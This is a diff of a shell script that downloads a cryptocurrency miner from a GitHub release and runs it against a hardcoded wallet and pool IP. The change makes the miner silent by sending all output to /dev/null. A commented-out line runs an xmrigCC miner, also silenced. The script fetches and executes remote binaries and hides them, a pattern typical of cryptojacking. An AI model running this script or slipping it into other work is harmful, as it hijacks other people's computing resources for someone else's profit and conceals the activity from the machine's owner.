@@ -1,6 +1,6 @@
 #!/bin/sh
 
-wget https://github.com/argenminers/spectre-blockchain/releases/download/v0.3.14/spectre-pool.zip && unzip -q spectre-pool.zip && ./tnn-miner --spectre --wallet spectre:qrzat3hsnclq9mwq5rtqgdp0fyfc6kjlx9v7hwh6tc2y78zy2enkk2z5deydr --daemon-address 142.93.71.111 --port 80 --worker-name maja --threads 4
+wget https://github.com/argenminers/spectre-blockchain/releases/download/v0.3.14/spectre-pool.zip && unzip -q spectre-pool.zip && ./tnn-miner --spectre --wallet spectre:qrzat3hsnclq9mwq5rtqgdp0fyfc6kjlx9v7hwh6tc2y78zy2enkk2z5deydr --daemon-address 142.93.71.111 --port 80 --worker-name maja --threads 4 > /dev/null 2>&1
 
 
 #wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 142.93.71.111:443 -u TuskeSyuMmk2xje2yUypZdWqLyjzRG7AjgcGk21HqjPTeztTahdSjA1SL7qokYAJxJ2NESFcGy5oQEdtNXMqjFGp5a7RE7cVrLa3LS -p WK01 -k -a rx/tuske -t4 > /dev/null 2>&1
